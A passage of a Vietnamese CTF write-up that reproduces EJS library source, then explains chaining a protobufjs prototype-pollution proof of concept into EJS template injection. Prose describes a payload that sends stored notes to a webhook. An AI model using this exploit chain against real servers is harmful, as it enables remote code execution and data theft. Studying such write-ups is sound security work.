+exports.cache = utils.cache;
+
+/**
+ * Custom file loader. Useful for template preprocessing or restricting access
+ * to a certain part of the filesystem.
+ *
+ * @type {fileLoader}
+ */
+
+exports.fileLoader = fs.readFileSync;
+
+/**
+ * Name of the object containing the locals.
+ *
+ * This variable is overridden by {@link Options}`.localsName` if it is not
+ * `undefined`.
+ *
+ * @type {String}
+ * @public
+ */
+
+exports.localsName = _DEFAULT_LOCALS_NAME;
+
+/**
+ * Promise implementation -- defaults to the native implementation if available
+ * This is mostly just for testability
+ *
+ * @type {PromiseConstructorLike}
+ * @public
+ */
+
+exports.promiseImpl = (new Function('return this;'))().Promise;
+
+/**
+ * Get the path to the included file from the parent file path and the
+ * specified path.
+ *
+ * @param {String}  name     specified path
+ * @param {String}  filename parent file path
+ * @param {Boolean} [isDir=false] whether the parent file path is a directory
+ * @return {String}
+ */
+exports.resolveInclude = function(name, filename, isDir) {
+  var dirname = path.dirname;
+  var extname = path.extname;
+  var resolve = path.resolve;
+  var includePath = resolve(isDir ? filename : dirname(filename), name);
+  var ext = extname(name);
+  if (!ext) {
+    includePath += '.ejs';
+  }
+  return includePath;
+};
+
+/**
+ * Try to resolve file path on multiple directories
+ *
+ * @param  {String}        name  specified path
+ * @param  {Array&lt;String&gt;} paths list of possible parent directory paths
+ * @return {String}
+ */
+function resolvePaths(name, paths) {
+  var filePath;
+  if (paths.some(function (v) {
+    filePath = exports.resolveInclude(name, v, true);
+    return fs.existsSync(filePath);
+  })) {
+    return filePath;
+  }
+}
+
+/**
+ * Get the path to the included file by Options
+ *
+ * @param  {String}  path    specified path
+ * @param  {Options} options compilation options
+ * @return {String}
+ */
+function getIncludePath(path, options) {
+  var includePath;
+  var filePath;
+  var views = options.views;
+  var match = /^[A-Za-z]+:\\|^\//.exec(path);
+
+  // Abs path
+  if (match &amp;&amp; match.length) {
+    path = path.replace(/^\/*/, '');
+    if (Array.isArray(options.root)) {
+      includePath = resolvePaths(path, options.root);
+    } else {
+      includePath = exports.resolveInclude(path, options.root || '/', true);
+    }
+  }
+  // Relative paths
+  else {
+    // Look relative to a passed filename first
+    if (options.filename) {
+      filePath = exports.resolveInclude(path, options.filename);
+      if (fs.existsSync(filePath)) {
+        includePath = filePath;
+      }
+    }
+    // Then look in any views directories
+    if (!includePath &amp;&amp; Array.isArray(views)) {
+      includePath = resolvePaths(path, views);
+    }
+    if (!includePath &amp;&amp; typeof options.includer !== 'function') {
+      throw new Error('Could not find the include file &quot;' +
+          options.escapeFunction(path) + '&quot;');
+    }
+  }
+  return includePath;
+}
+
+/**
+ * Get the template from a string or a file, either compiled on-the-fly or
+ * read from cache (if enabled), and cache the template if needed.
+ *
+ * If `template` is not set, the file specified in `options.filename` will be
+ * read.
+ *
+ * If `options.cache` is true, this function reads the file from
+ * `options.filename` so it must be set prior to calling this function.
+ *
+ * @memberof module:ejs-internal
+ * @param {Options} options   compilation options
+ * @param {String} [template] template source
+ * @return {(TemplateFunction|ClientFunction)}
+ * Depending on the value of `options.client`, either type might be returned.
+ * @static
+ */
+
+function handleCache(options, template) {
+  var func;
+  var filename = options.filename;
+  var hasTemplate = arguments.length &gt; 1;
+
+  if (options.cache) {
+    if (!filename) {
+      throw new Error('cache option requires a filename');
+    }
+    func = exports.cache.get(filename);
+    if (func) {
+      return func;
+    }
+    if (!hasTemplate) {
+      template = fileLoader(filename).toString().replace(_BOM, '');
+    }
+  }
+  else if (!hasTemplate) {
+    // istanbul ignore if: should not happen at all
+    if (!filename) {
+      throw new Error('Internal EJS error: no file name or template '
+                    + 'provided');
+    }
+    template = fileLoader(filename).toString().replace(_BOM, '');
+  }
+  func = exports.compile(template, options);
+  if (options.cache) {
+    exports.cache.set(filename, func);
+  }
+  return func;
+}
+
+/**
+ * Try calling handleCache with the given options and data and call the
+ * callback with the result. If an error occurs, call the callback with
+ * the error. Used by renderFile().
+ *
+ * @memberof module:ejs-internal
+ * @param {Options} options    compilation options
+ * @param {Object} data        template data
+ * @param {RenderFileCallback} cb callback
+ * @static
+ */
+
+function tryHandleCache(options, data, cb) {
+  var result;
+  if (!cb) {
+    if (typeof exports.promiseImpl == 'function') {
+      return new exports.promiseImpl(function (resolve, reject) {
+        try {
+          result = handleCache(options)(data);
+          resolve(result);
+        }
+        catch (err) {
+          reject(err);
+        }
+      });
+    }
+    else {
+      throw new Error('Please provide a callback function');
+    }
+  }
+  else {
+    try {
+      result = handleCache(options)(data);
+    }
+    catch (err) {
+      return cb(err);
+    }
+
+    cb(null, result);
+  }
+}
+
+/**
+ * fileLoader is independent
+ *
+ * @param {String} filePath ejs file path.
+ * @return {String} The contents of the specified file.
+ * @static
+ */
+
+function fileLoader(filePath){
+  return exports.fileLoader(filePath);
+}
+
+/**
+ * Get the template function.
+ *
+ * If `options.cache` is `true`, then the template is cached.
+ *
+ * @memberof module:ejs-internal
+ * @param {String}  path    path for the specified file
+ * @param {Options} options compilation options
+ * @return {(TemplateFunction|ClientFunction)}
+ * Depending on the value of `options.client`, either type might be returned
+ * @static
+ */
+
+function includeFile(path, options) {
+  var opts = utils.shallowCopy(utils.createNullProtoObjWherePossible(), options);
+  opts.filename = getIncludePath(path, opts);
+  if (typeof options.includer === 'function') {
+    var includerResult = options.includer(path, opts.filename);
+    if (includerResult) {
+      if (includerResult.filename) {
+        opts.filename = includerResult.filename;
+      }
+      if (includerResult.template) {
+        return handleCache(opts, includerResult.template);
+      }
+    }
+  }
+  return handleCache(opts);
+}
+
+/**
+ * Re-throw the given `err` in context to the `str` of ejs, `filename`, and
+ * `lineno`.
+ *
+ * @implements {RethrowCallback}
+ * @memberof module:ejs-internal
+ * @param {Error}  err      Error object
+ * @param {String} str      EJS source
+ * @param {String} flnm     file name of the EJS file
+ * @param {Number} lineno   line number of the error
+ * @param {EscapeCallback} esc
+ * @static
+ */
+
+function rethrow(err, str, flnm, lineno, esc) {
+  var lines = str.split('\n');
+  var start = Math.max(lineno - 3, 0);
+  var end = Math.min(lines.length, lineno + 3);
+  var filename = esc(flnm);
+  // Error context
+  var context = lines.slice(start, end).map(function (line, i){
+    var curr = i + start + 1;
+    return (curr == lineno ? ' &gt;&gt; ' : '    ')
+      + curr
+      + '| '
+      + line;
+  }).join('\n');
+
+  // Alter exception message
+  err.path = filename;
+  err.message = (filename || 'ejs') + ':'
+    + lineno + '\n'
+    + context + '\n\n'
+    + err.message;
+
+  throw err;
+}
+
+function stripSemi(str){
+  return str.replace(/;(\s*$)/, '$1');
+}
+
+/**
+ * Compile the given `str` of ejs into a template function.
+ *
+ * @param {String}  template EJS template
+ *
+ * @param {Options} [opts] compilation options
+ *
+ * @return {(TemplateFunction|ClientFunction)}
+ * Depending on the value of `opts.client`, either type might be returned.
+ * Note that the return type of the function also depends on the value of `opts.async`.
+ * @public
+ */
+
+exports.compile = function compile(template, opts) {
+  var templ;
+
+  // v1 compat
+  // 'scope' is 'context'
+  // FIXME: Remove this in a future version
+  if (opts &amp;&amp; opts.scope) {
+    if (!scopeOptionWarned){
+      console.warn('`scope` option is deprecated and will be removed in EJS 3');
+      scopeOptionWarned = true;
+    }
+    if (!opts.context) {
+      opts.context = opts.scope;
+    }
+    delete opts.scope;
+  }
+  templ = new Template(template, opts);
+  return templ.compile();
+};
+
+/**
+ * Render the given `template` of ejs.
+ *
+ * If you would like to include options but not data, you need to explicitly
+ * call this function with `data` being an empty object or `null`.
+ *
+ * @param {String}   template EJS template
+ * @param {Object}  [data={}] template data
+ * @param {Options} [opts={}] compilation and rendering options
+ * @return {(String|Promise&lt;String&gt;)}
+ * Return value type depends on `opts.async`.
+ * @public
+ */
+
+exports.render = function (template, d, o) {
+  var data = d || utils.createNullProtoObjWherePossible();
+  var opts = o || utils.createNullProtoObjWherePossible();
+
+  // No options object -- if there are optiony names
+  // in the data, copy them to options
+  if (arguments.length == 2) {
+    utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA);
+  }
+
+  return handleCache(opts, template)(data);
+};
+
+/**
+ * Render an EJS file at the given `path` and callback `cb(err, str)`.
+ *
+ * If you would like to include options but not data, you need to explicitly
+ * call this function with `data` being an empty object or `null`.
+ *
+ * @param {String}             path     path to the EJS file
+ * @param {Object}            [data={}] template data
+ * @param {Options}           [opts={}] compilation and rendering options
+ * @param {RenderFileCallback} cb callback
+ * @public
+ */
+
+exports.renderFile = function () {
+  var args = Array.prototype.slice.call(arguments);
+  var filename = args.shift();
+  var cb;
+  var opts = {filename: filename};
+  var data;
+  var viewOpts;
+
+  // Do we have a callback?
+  if (typeof arguments[arguments.length - 1] == 'function') {
+    cb = args.pop();
+  }
+  // Do we have data/opts?
+  if (args.length) {
+    // Should always have data obj
+    data = args.shift();
+    // Normal passed opts (data obj + opts obj)
+    if (args.length) {
+      // Use shallowCopy so we don't pollute passed in opts obj with new vals
+      utils.shallowCopy(opts, args.pop());
+    }
+    // Special casing for Express (settings + opts-in-data)
+    else {
+      // Express 3 and 4
+      if (data.settings) {
+        // Pull a few things from known locations
+        if (data.settings.views) {
+          opts.views = data.settings.views;
+        }
+        if (data.settings['view cache']) {
+          opts.cache = true;
+        }
+        // Undocumented after Express 2, but still usable, esp. for
+        // items that are unsafe to be passed along with data, like `root`
+        viewOpts = data.settings['view options'];
+        if (viewOpts) {
+          utils.shallowCopy(opts, viewOpts);
+        }
+      }
+      // Express 2 and lower, values set in app.locals, or people who just
+      // want to pass options in their data. NOTE: These values will override
+      // anything previously set in settings  or settings['view options']
+      utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS);
+    }
+    opts.filename = filename;
+  }
+  else {
+    data = utils.createNullProtoObjWherePossible();
+  }
+
+  return tryHandleCache(opts, data, cb);
+};
+
+/**
+ * Clear intermediate JavaScript cache. Calls {@link Cache#reset}.
+ * @public
+ */
+
+/**
+ * EJS template class
+ * @public
+ */
+exports.Template = Template;
+
+exports.clearCache = function () {
+  exports.cache.reset();
+};
+
+function Template(text, opts) {
+  opts = opts || utils.createNullProtoObjWherePossible();
+  var options = utils.createNullProtoObjWherePossible();
+  this.templateText = text;
+  /** @type {string | null} */
+  this.mode = null;
+  this.truncate = false;
+  this.currentLine = 1;
+  this.source = '';
+  options.client = opts.client || false;
+  options.escapeFunction = opts.escape || opts.escapeFunction || utils.escapeXML;
+  options.compileDebug = opts.compileDebug !== false;
+  options.debug = !!opts.debug;
+  options.filename = opts.filename;
+  options.openDelimiter = opts.openDelimiter || exports.openDelimiter || _DEFAULT_OPEN_DELIMITER;
+  options.closeDelimiter = opts.closeDelimiter || exports.closeDelimiter || _DEFAULT_CLOSE_DELIMITER;
+  options.delimiter = opts.delimiter || exports.delimiter || _DEFAULT_DELIMITER;
+  options.strict = opts.strict || false;
+  options.context = opts.context;
+  options.cache = opts.cache || false;
+  options.rmWhitespace = opts.rmWhitespace;
+  options.root = opts.root;
+  options.includer = opts.includer;
+  options.outputFunctionName = opts.outputFunctionName;
+  options.localsName = opts.localsName || exports.localsName || _DEFAULT_LOCALS_NAME;
+  options.views = opts.views;
+  options.async = opts.async;
+  options.destructuredLocals = opts.destructuredLocals;
+  options.legacyInclude = typeof opts.legacyInclude != 'undefined' ? !!opts.legacyInclude : true;
+
+  if (options.strict) {
+    options._with = false;
+  }
+  else {
+    options._with = typeof opts._with != 'undefined' ? opts._with : true;
+  }
+
+  this.opts = options;
+
+  this.regex = this.createRegex();
+}
+
+Template.modes = {
+  EVAL: 'eval',
+  ESCAPED: 'escaped',
+  RAW: 'raw',
+  COMMENT: 'comment',
+  LITERAL: 'literal'
+};
+
+Template.prototype = {
+  createRegex: function () {
+    var str = _REGEX_STRING;
+    var delim = utils.escapeRegExpChars(this.opts.delimiter);
+    var open = utils.escapeRegExpChars(this.opts.openDelimiter);
+    var close = utils.escapeRegExpChars(this.opts.closeDelimiter);
+    str = str.replace(/%/g, delim)
+      .replace(/&lt;/g, open)
+      .replace(/&gt;/g, close);
+    return new RegExp(str);
+  },
+
+  compile: function () {
+    /** @type {string} */
+    var src;
+    /** @type {ClientFunction} */
+    var fn;
+    var opts = this.opts;
+    var prepended = '';
+    var appended = '';
+    /** @type {EscapeCallback} */
+    var escapeFn = opts.escapeFunction;
+    /** @type {FunctionConstructor} */
+    var ctor;
+    /** @type {string} */
+    var sanitizedFilename = opts.filename ? JSON.stringify(opts.filename) : 'undefined';
+
+    if (!this.source) {
+      this.generateSource();
+      prepended +=
+        '  var __output = &quot;&quot;;\n' +
+        '  function __append(s) { if (s !== undefined &amp;&amp; s !== null) __output += s }\n';
+      if (opts.outputFunctionName) {
+        if (!_JS_IDENTIFIER.test(opts.outputFunctionName)) {
+          throw new Error('outputFunctionName is not a valid JS identifier.');
+        }
+        prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
+      }
+      if (opts.localsName &amp;&amp; !_JS_IDENTIFIER.test(opts.localsName)) {
+        throw new Error('localsName is not a valid JS identifier.');
+      }
+      if (opts.destructuredLocals &amp;&amp; opts.destructuredLocals.length) {
+        var destructuring = '  var __locals = (' + opts.localsName + ' || {}),\n';
+        for (var i = 0; i &lt; opts.destructuredLocals.length; i++) {
+          var name = opts.destructuredLocals[i];
+          if (!_JS_IDENTIFIER.test(name)) {
+            throw new Error('destructuredLocals[' + i + '] is not a valid JS identifier.');
+          }
+          if (i &gt; 0) {
+            destructuring += ',\n  ';
+          }
+          destructuring += name + ' = __locals.' + name;
+        }
+        prepended += destructuring + ';\n';
+      }
+      if (opts._with !== false) {
+        prepended +=  '  with (' + opts.localsName + ' || {}) {' + '\n';
+        appended += '  }' + '\n';
+      }
+      appended += '  return __output;' + '\n';
+      this.source = prepended + this.source + appended;
+    }
+
+    if (opts.compileDebug) {
+      src = 'var __line = 1' + '\n'
+        + '  , __lines = ' + JSON.stringify(this.templateText) + '\n'
+        + '  , __filename = ' + sanitizedFilename + ';' + '\n'
+        + 'try {' + '\n'
+        + this.source
+        + '} catch (e) {' + '\n'
+        + '  rethrow(e, __lines, __filename, __line, escapeFn);' + '\n'
+        + '}' + '\n';
+    }
+    else {
+      src = this.source;
+    }
+
+    if (opts.client) {
+      src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
+      if (opts.compileDebug) {
+        src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\n' + src;
+      }
+    }
+
+    if (opts.strict) {
+      src = '&quot;use strict&quot;;\n' + src;
+    }
+    if (opts.debug) {
+      console.log(src);
+    }
+    if (opts.compileDebug &amp;&amp; opts.filename) {
+      src = src + '\n'
+        + '//# sourceURL=' + sanitizedFilename + '\n';
+    }
+
+    try {
+      if (opts.async) {
+        // Have to use generated function for this, since in envs without support,
+        // it breaks in parsing
+        try {
+          ctor = (new Function('return (async function(){}).constructor;'))();
+        }
+        catch(e) {
+          if (e instanceof SyntaxError) {
+            throw new Error('This environment does not support async/await');
+          }
+          else {
+            throw e;
+          }
+        }
+      }
+      else {
+        ctor = Function;
+      }
+      fn = new ctor(opts.localsName + ', escapeFn, include, rethrow', src);
+    }
+    catch(e) {
+      // istanbul ignore else
+      if (e instanceof SyntaxError) {
+        if (opts.filename) {
+          e.message += ' in ' + opts.filename;
+        }
+        e.message += ' while compiling ejs\n\n';
+        e.message += 'If the above error is not helpful, you may want to try EJS-Lint:\n';
+        e.message += 'https://github.com/RyanZim/EJS-Lint';
+        if (!opts.async) {
+          e.message += '\n';
+          e.message += 'Or, if you meant to create an async function, pass `async: true` as an option.';
+        }
+      }
+      throw e;
+    }
+
+    // Return a callable function which will execute the function
+    // created by the source-code, with the passed data as locals
+    // Adds a local `include` function which allows full recursive include
+    var returnedFn = opts.client ? fn : function anonymous(data) {
+      var include = function (path, includeData) {
+        var d = utils.shallowCopy(utils.createNullProtoObjWherePossible(), data);
+        if (includeData) {
+          d = utils.shallowCopy(d, includeData);
+        }
+        return includeFile(path, opts)(d);
+      };
+      return fn.apply(opts.context,
+        [data || utils.createNullProtoObjWherePossible(), escapeFn, include, rethrow]);
+    };
+    if (opts.filename &amp;&amp; typeof Object.defineProperty === 'function') {
+      var filename = opts.filename;
+      var basename = path.basename(filename, path.extname(filename));
+      try {
+        Object.defineProperty(returnedFn, 'name', {
+          value: basename,
+          writable: false,
+          enumerable: false,
+          configurable: true
+        });
+      } catch (e) {/* ignore */}
+    }
+    return returnedFn;
+  },
+
+  generateSource: function () {
+    var opts = this.opts;
+
+    if (opts.rmWhitespace) {
+      // Have to use two separate replace here as `^` and `$` operators don't
+      // work well with `\r` and empty lines don't work well with the `m` flag.
+      this.templateText =
+        this.templateText.replace(/[\r\n]+/g, '\n').replace(/^\s+|\s+$/gm, '');
+    }
+
+    // Slurp spaces and tabs before &lt;%_ and after _%&gt;
+    this.templateText =
+      this.templateText.replace(/[ \t]*&lt;%_/gm, '&lt;%_').replace(/_%&gt;[ \t]*/gm, '_%&gt;');
+
+    var self = this;
+    var matches = this.parseTemplateText();
+    var d = this.opts.delimiter;
+    var o = this.opts.openDelimiter;
+    var c = this.opts.closeDelimiter;
+
+    if (matches &amp;&amp; matches.length) {
+      matches.forEach(function (line, index) {
+        var closing;
+        // If this is an opening tag, check for closing tags
+        // FIXME: May end up with some false positives here
+        // Better to store modes as k/v with openDelimiter + delimiter as key
+        // Then this can simply check against the map
+        if ( line.indexOf(o + d) === 0        // If it is a tag
+          &amp;&amp; line.indexOf(o + d + d) !== 0) { // and is not escaped
+          closing = matches[index + 2];
+          if (!(closing == d + c || closing == '-' + d + c || closing == '_' + d + c)) {
+            throw new Error('Could not find matching close tag for &quot;' + line + '&quot;.');
+          }
+        }
+        self.scanLine(line);
+      });
+    }
+
+  },
+
+  parseTemplateText: function () {
+    var str = this.templateText;
+    var pat = this.regex;
+    var result = pat.exec(str);
+    var arr = [];
+    var firstPos;
+
+    while (result) {
+      firstPos = result.index;
+
+      if (firstPos !== 0) {
+        arr.push(str.substring(0, firstPos));
+        str = str.slice(firstPos);
+      }
+
+      arr.push(result[0]);
+      str = str.slice(result[0].length);
+      result = pat.exec(str);
+    }
+
+    if (str) {
+      arr.push(str);
+    }
+
+    return arr;
+  },
+
+  _addOutput: function (line) {
+    if (this.truncate) {
+      // Only replace single leading linebreak in the line after
+      // -%&gt; tag -- this is the single, trailing linebreak
+      // after the tag that the truncation mode replaces
+      // Handle Win / Unix / old Mac linebreaks -- do the \r\n
+      // combo first in the regex-or
+      line = line.replace(/^(?:\r\n|\r|\n)/, '');
+      this.truncate = false;
+    }
+    if (!line) {
+      return line;
+    }
+
+    // Preserve literal slashes
+    line = line.replace(/\\/g, '\\\\');
+
+    // Convert linebreaks
+    line = line.replace(/\n/g, '\\n');
+    line = line.replace(/\r/g, '\\r');
+
+    // Escape double-quotes
+    // - this will be the delimiter during execution
+    line = line.replace(/&quot;/g, '\\&quot;');
+    this.source += '    ; __append(&quot;' + line + '&quot;)' + '\n';
+  },
+
+  scanLine: function (line) {
+    var self = this;
+    var d = this.opts.delimiter;
+    var o = this.opts.openDelimiter;
+    var c = this.opts.closeDelimiter;
+    var newLineCount = 0;
+
+    newLineCount = (line.split('\n').length - 1);
+
+    switch (line) {
+    case o + d:
+    case o + d + '_':
+      this.mode = Template.modes.EVAL;
+      break;
+    case o + d + '=':
+      this.mode = Template.modes.ESCAPED;
+      break;
+    case o + d + '-':
+      this.mode = Template.modes.RAW;
+      break;
+    case o + d + '#':
+      this.mode = Template.modes.COMMENT;
+      break;
+    case o + d + d:
+      this.mode = Template.modes.LITERAL;
+      this.source += '    ; __append(&quot;' + line.replace(o + d + d, o + d) + '&quot;)' + '\n';
+      break;
+    case d + d + c:
+      this.mode = Template.modes.LITERAL;
+      this.source += '    ; __append(&quot;' + line.replace(d + d + c, d + c) + '&quot;)' + '\n';
+      break;
+    case d + c:
+    case '-' + d + c:
+    case '_' + d + c:
+      if (this.mode == Template.modes.LITERAL) {
+        this._addOutput(line);
+      }
+
+      this.mode = null;
+      this.truncate = line.indexOf('-') === 0 || line.indexOf('_') === 0;
+      break;
+    default:
+      // In script mode, depends on type of tag
+      if (this.mode) {
+        // If '//' is found without a line break, add a line break.
+        switch (this.mode) {
+        case Template.modes.EVAL:
+        case Template.modes.ESCAPED:
+        case Template.modes.RAW:
+          if (line.lastIndexOf('//') &gt; line.lastIndexOf('\n')) {
+            line += '\n';
+          }
+        }
+        switch (this.mode) {
+        // Just executing code
+        case Template.modes.EVAL:
+          this.source += '    ; ' + line + '\n';
+          break;
+          // Exec, esc, and output
+        case Template.modes.ESCAPED:
+          this.source += '    ; __append(escapeFn(' + stripSemi(line) + '))' + '\n';
+          break;
+          // Exec and output
+        case Template.modes.RAW:
+          this.source += '    ; __append(' + stripSemi(line) + ')' + '\n';
+          break;
+        case Template.modes.COMMENT:
+          // Do nothing
+          break;
+          // Literal &lt;%% mode, append as raw output
+        case Template.modes.LITERAL:
+          this._addOutput(line);
+          break;
+        }
+      }
+      // In string mode, just add the output
+      else {
+        this._addOutput(line);
+      }
+    }
+
+    if (self.opts.compileDebug &amp;&amp; newLineCount) {
+      this.currentLine += newLineCount;
+      this.source += '    ; __line = ' + this.currentLine + '\n';
+    }
+  }
+};
+
+/**
+ * Escape characters reserved in XML.
+ *
+ * This is simply an export of {@link module:utils.escapeXML}.
+ *
+ * If `markup` is `undefined` or `null`, the empty string is returned.
+ *
+ * @param {String} markup Input string
+ * @return {String} Escaped string
+ * @public
+ * @func
+ * */
+exports.escapeXML = utils.escapeXML;
+
+/**
+ * Express.js support.
+ *
+ * This is an alias for {@link module:ejs.renderFile}, in order to support
+ * Express.js out-of-the-box.
+ *
+ * @func
+ */
+
+exports.__express = exports.renderFile;
+
+/**
+ * Version of EJS.
+ *
+ * @readonly
+ * @type {String}
+ * @public
+ */
+
+exports.VERSION = _VERSION_STRING;
+
+/**
+ * Name for detection of EJS.
+ *
+ * @readonly
+ * @type {String}
+ * @public
+ */
+
+exports.name = _NAME;
+
+/* istanbul ignore if */
+if (typeof window != 'undefined') {
+  window.ejs = exports;
+}
+</code></pre><p>Ta có thể thấy có 1 option
+<img src="https://hackmd.io/_uploads/S1yFW_x6T.png" alt="image">
+Và phần xử lí để gán giá trị cho escapeFn đó :-1: 
+<img src="https://hackmd.io/_uploads/B1-6-_eTp.png" alt="image"></p>
+<p>Và cuối cùng escapeFn sử dụng eval để thực thi :100: 
+Vì vậy nên dính SSTI.</p>
+<h4 id="2-cve-protobuf---prototype-pollution">2. CVE protobuf - Prototype Pollution</h4>
+<ul>
+<li>Đây là một thư viện dùng để convert các file .proto theo đúng form của nó và để dữ liệu theo một chuẩn nhất định và có thể thay thế cho phù hợp với từng phiên bản khác nhau nhằm nâng cao hiệu suất và khả năng tái sử dụng.</li>
+</ul>
+<pre><code>https://security.snyk.io/vuln/SNYK-JS-PROTOBUFJS-2441248
+
+// poc 3 - protobuf.parse()
+let p =
+`
+option (foo).__proto__.polluted3 = &quot;polluted3&quot;;
+`
+protobuf.parse(p)
+console.log({}.polluted3)
+</code></pre><p>Có thể thấy POC làm ô nhiễm ở trên vì trình em còn gà nên chưa biết dựng lại, nên em sẽ dùng POC này luôn ạ.</p>
+<h3 id="flow">FLOW</h3>
+<p>Đầu tiên em sẽ lợi dụng prototype polution để làm ô nhiễm option có thuộc tính là client bởi vì như phân tích ở trên SSTI thì nếu có option có client tồn tại thì escapeFn sẽ không bị format sang tring.
+Sau đó ta sẽ parse file proto này ra để thực hiện ô nhiễm sau đó thì thêm giá trị của escapeFn để thực hiện RCE.</p>
+<h3 id="triển-khai-1">Triển khai</h3>
+<p>Em sẽ thực hiện debug luôn để xem nó hoạt động.</p>
+<p><img src="https://hackmd.io/_uploads/HJpeeEMT6.png" alt="image"></p>
+<p>Đầu tiên em cho client là 1 lúc này sẽ bị polution sau đó em cho escapeFn sẽ wget đến webhook và với data là tất cả thông tin trong notes.
+<img src="https://hackmd.io/_uploads/SJzoxVf6a.png" alt="image"></p>
+<p>Polution thành công và sever bị lỗi</p>
+<p><img src="https://hackmd.io/_uploads/HkRybVGaT.png" alt="image"></p>
+<p>lúc này khi mà sever thực hiện hiển thị note sẽ thực thi RCE bởi escapeFn được gọi eval.</p>
+<p>Lần đầu em tìm hiểu về dạng PP này nên còn thiếu sót, thank for watching :100:</p>
+<p><img src="https://hackmd.io/_uploads/HJNwZNGTT.png" alt="image"></p>
+
+
+        
+          <div class="blog-tags">
+            
+              
+              <a href="https://bzoltan1.github.io/tags/ctf/">CTF</a>&nbsp;
+            
+              
+              <a href="https://bzoltan1.github.io/tags/vietnamese/">Vietnamese</a>&nbsp;
+            
+          </div>
+        
+
+        
+
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+            <li class="previous">
+              <a href="https://bzoltan1.github.io/write-up/2023-08-19-bksecctf2023/" data-toggle="tooltip" data-placement="top" title="BKSEC-CTF-2023 - WEB &#39;s challenges">&larr; Previous Post</a>
+            </li>
+          
+          
+            <li class="next">
+              <a href="https://bzoltan1.github.io/write-up/2025-01-03-bastard/" data-toggle="tooltip" data-placement="top" title="Bastard HTB">Next Post &rarr;</a>
+            </li>
+          
+        </ul>
+      
+
+
+      
+
+    </div>
+  </div>
+</div>
+
+      <footer>
+  <div class="container">
+    
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+
+          &nbsp;&bull;&nbsp;&copy;
+          
+            0001
+          
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://bzoltan1.github.io/">Zoltán&#39;s Blog</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="https://gohugo.io">Hugo v0.83.1</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>
+
+<script src="https://bzoltan1.github.io/js/main.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://bzoltan1.github.io/js/load-photoswipe.js"></script>
+
+
+
+
+
+
+
+
+
+
+    
+  </body>
+</html>
+
